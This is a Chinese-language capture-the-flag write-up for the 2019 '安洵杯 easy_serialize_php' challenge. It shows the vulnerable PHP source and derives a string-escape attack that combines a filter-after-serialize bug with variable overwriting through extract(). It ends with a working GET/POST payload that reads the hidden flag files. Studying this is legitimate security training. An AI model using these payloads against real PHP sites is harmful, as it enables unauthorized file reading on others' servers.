## [安洵杯 2019]easy_serialize_php

```php
 <?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}


if($_SESSION){
    unset($_SESSION);
}

$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;

extract($_POST);

if(!$function){
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){
    $_SESSION['img'] = base64_encode('guest_img.png');
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
}
```

可控参数有

`f，user，function`(这里可以利用extract函数进行变量覆盖)

我们查看一下phpinfo里面，发现有个`d0g3_f1ag.php`文件

基本思路就有了

```
使$userinfo['img']等于ZDBnM19mMWFnLnBocA==，读取d0g3_f1ag.php文件的内容
```

`$_SESSION['img'] = sha1(base64_encode($_GET['img_path']));`这里进行sha1加密就不能base64

解码，所以只能走if这条路

发现这个函数`preg_replace`，想到了可以进行字符串逃逸

我们将变量赋值为

```php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = '11';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');
```

序列化结果

```
a:3:{s:4:"user";s:5:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

如果想让img参数进行解析，我们需要吃的字符串是`";s:8:"function";s:2:"11`24个字符，6个flag正好是24个字符

赋值

```php
$_SESSION["user"] = 'guestflagflagflagflagflagflag';
$_SESSION['function'] = '11';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');
```

序列化结果

```
a:3:{s:4:"user";s:29:"guest";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

这样img参数就可以解析，但function参数没了，我们要加上function参数

赋值

```php
$_SESSION["user"] = 'guestflagflagflagflagflagflag';
$_SESSION['function'] = '";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');
```

序列化结果

```
a:3:{s:4:"user";s:29:"guest";s:8:"function";s:65:"";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

在user变量里，会多吃一个`"`,即`guest";s:8:"function";s:65:""`这样才是29个字符，我们需要在function参数前多加一个字符

```
$_SESSION['function'] = 'a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';
```

序列化结果

```
a:3:{s:4:"user";s:29:"guest";s:8:"function";s:66:"a";s:8:"function";s:2:"11";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
```

这样就都能被解析了

payload

```
GET传参:
f=show_image
POST传参:
_SESSION[user]=guestflagflagflagflagflagflag&_SESSION[function]=a";s:8:"function";s:2:"11";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
```

`d0g3_f1ag.php`文件的内容是

```php
<?php

$flag = 'flag in /d0g3_fllllllag';

?>
```

同样读取`/d0g3_fllllllag`文件

```php
<?php
function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

$_SESSION["user"] = 'guestflagflagflagflagflagflag';
$_SESSION['function'] = 'a";s:8:"function";s:2:"11";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}';
$_SESSION['img'] = base64_encode('d0g3_f1ag.php');


$serialize_info = filter(serialize($_SESSION));
echo $serialize_info;
```

学这道题前，可以先学习字符串逃逸的原理